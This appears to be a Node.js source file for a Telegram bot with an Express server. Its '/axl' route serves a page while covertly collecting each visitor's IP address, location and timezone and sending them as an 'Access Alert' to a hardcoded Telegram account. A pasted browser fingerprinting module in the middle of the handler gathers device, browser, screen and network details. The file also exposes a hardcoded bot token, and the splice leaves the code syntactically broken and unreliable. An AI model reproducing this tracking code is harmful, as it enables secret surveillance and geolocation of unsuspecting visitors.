const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const path = require('path');
const axios = require('axios');

// Get the bot token from environment variables
const token = "7388778092:AAEo4Nhm5LM-cc3fvxPCb6ifyNzH1KUz9KE";

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

/*const getAxl = async function(url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url: url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
      },
      ...options,
    });
    return res.data;
  } catch (err) {
    return err;
  }
};*/

// Define support links
const SUPPORT_LINKS = {
  repo: "https://github.com/sataniceypz/Izumi-v3",
  channel: "https://whatsapp.com/channel/0029Vaf2tKvGZNCmuSg8ma2O",
  group: "https://chat.whatsapp.com/KHvcGD7aEUo8gPocJsYXZe"
};

// Create an express app to bind to the port
const app = express();

// Command to start the bot and show buttons
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Support', callback_data: 'support' }]
      ]
    }
  };

  bot.sendMessage(chatId, 'Welcome! Choose an option:', options);
});

// Callback query handler
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === 'support') {
    const message = `
💬 *Support Links*:
- 📂 *Repo*: [GitHub Repo](${SUPPORT_LINKS.repo})
- 📢 *Channel*: [WhatsApp Channel](${SUPPORT_LINKS.channel})
- 👥 *Group*: [WhatsApp Group](${SUPPORT_LINKS.group})
    `;
    bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } 
});

// Error handler for unhandled errors
bot.on('polling_error', (error) => {
  console.error(error);
});

// Define Telegram ID for user to send messages
const ajsal = '6524787237';

// Set up a basic HTTP server to bind to the port (required by Render)
app.get('/axl', async (req, res) => {
 /* try {
    const ipInfox = await axios.get('https://ipapi.co/json/');
    const ipInfo = ipInfox.data;
    const ipmsgg = `
🚨 *Access Alert*:
- 📱 *Device*: Areela🙂
- 🌐 *IP*: ${ipInfo.ip || 'N/A'}
- 📍 *Location*: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}
- 🕒 *TimeZone*: ${ipInfo.timezone}
    `;*/

  // userAgent.js

export const getUserAgentInfo = () => {
  const userAgent = navigator.userAgent;

  // Device Model Name
  let deviceName = "unknown";
  if (userAgent.includes("Android")) {
    const match = userAgent.match(/Android [\d.]+; ([a-zA-Z0-9\s]+)/);
    deviceName = match ? match[1] : deviceName;
  } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
    const match = userAgent.match(/\(([a-zA-Z0-9\s]+);/);
    deviceName = match ? match[1] : deviceName;
  } else if (userAgent.includes("Macintosh") || userAgent.includes("Windows")) {
    if (userAgent.includes("Macintosh")) {
      const match = userAgent.match(/Macintosh.*\) ([a-zA-Z0-9\s]+)/);
      deviceName = match ? match[1] : deviceName;
    } else if (userAgent.includes("Windows")) {
      const match = userAgent.match(/Windows NT.*; ([a-zA-Z0-9\s]+)/);
      deviceName = match ? match[1] : deviceName;
    }
  }

  // Device Vendor Name
  let deviceVendor = "Unknown";
  if (/iPad|iPhone/i.test(userAgent)) deviceVendor = "Apple";
  else if (/Macintosh/i.test(userAgent)) deviceVendor = "Apple (Macintosh)";
  else if (/Android/i.test(userAgent)) deviceVendor = "Android";
  else if (/Windows/i.test(userAgent)) deviceVendor = "Microsoft (Windows)";
  else if (/BlackBerry/i.test(userAgent)) deviceVendor = "BlackBerry";
  else if (/Linux/i.test(userAgent)) deviceVendor = "Linux";

  // Device Type
  let deviceType = "Desktop";
  if (/mobile|android/i.test(userAgent)) deviceType = "Mobile";
  else if (/tablet|ipad/i.test(userAgent)) deviceType = "Tablet";

  // OS Version
  const osVersion =
    (userAgent.match(/(iPhone|iPad|iPod|Android|Windows|Macintosh)\s([0-9._]+)/) || [])[2] ||
    "Unknown";

  // Browser Info
  const browserInfo = {
    name:
      userAgent.indexOf("Firefox") > -1
        ? "Firefox"
        : userAgent.indexOf("Chrome") > -1
        ? "Chrome"
        : userAgent.indexOf("Safari") > -1
        ? "Safari"
        : userAgent.indexOf("Edge") > -1
        ? "Edge"
        : userAgent.indexOf("Opera") > -1
        ? "Opera"
        : userAgent.indexOf("msie") > -1 || userAgent.indexOf("trident") > -1
        ? "Internet Explorer"
        : "unknown",
    version: userAgent.match(/(?:MSIE|Edge|Opera|Firefox|Chrome|Safari)[\/\s](\d+\.\d+)/)
      ? RegExp.$1
      : "unknown",
    engine:
      userAgent.indexOf("Trident") != -1
        ? "Trident"
        : userAgent.indexOf("Edge") != -1
        ? "EdgeHTML"
        : userAgent.indexOf("AppleWebKit") != -1
        ? "WebKit"
        : userAgent.indexOf("Gecko") != -1 && userAgent.indexOf("like Gecko") == -1
        ? "Gecko"
        : "Unknown",
    vendor: navigator.vendor || "Unknown",
  };

  // Screen Info
  const screenInfo = {
    screenSize: `${window.screen.height}x${window.screen.width}`,
    viewportSize: `${window.innerHeight || document.documentElement.clientHeight}x${
      window.innerWidth || document.documentElement.clientWidth
    }`,
    devicePixelRatio: window.devicePixelRatio || "Unknown",
    colorDepth: window.screen.colorDepth || "Unknown",
  };

  // Time Info
  const timezone = new Date().toString().match(/\(([^)]+)\)/)?.[1] || "Unknown";

  // Networking Info
  const connection = navigator.connection || {};
  const networkInfo = {
    type: connection.type || "Unknown",
    effectiveType: connection.effectiveType || "Unknown",
    downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
    rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
    saveData: connection.saveData ? "Enabled" : "Disabled",
  };

  return {
    deviceName,
    deviceVendor,
    deviceType,
    osVersion,
    browserInfo,
    screenInfo,
    timezone,
    networkInfo,
  };
};

export const getLocationInfo = async () => {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    return {
      latitude: data.latitude,
      longitude: data.longitude,
      region: data.region,
      city: data.city,
      country: data.country_name,
      ip: data.ip,
      currency: data.currency_name,
    };
  } catch (error) {
    console.error("Error fetching location info:", error);
    return {
      latitude: "N/A",
      longitude: "N/A",
      region: "N/A",
      city: "N/A",
      country: "N/A",
      ip: "N/A",
      currency: "N/A",
    };
  }
};

  const fsg = `hi ${timezone}`;

    // Send a message to your Telegram ID with the detected device name
    await bot.sendMessage(ajsal, fsg);
    
    res.sendFile(path.join(__dirname, 'index.html'));
  } catch (error) {
    console.error('Error fetching IP info:', error);
    res.status(500).send('Error fetching IP information.');
  }
});

// Start the server
app.listen(process.env.PORT || 3000, () => {
  console.log(`Server is running on port ${process.env.PORT || 3000}`);
});
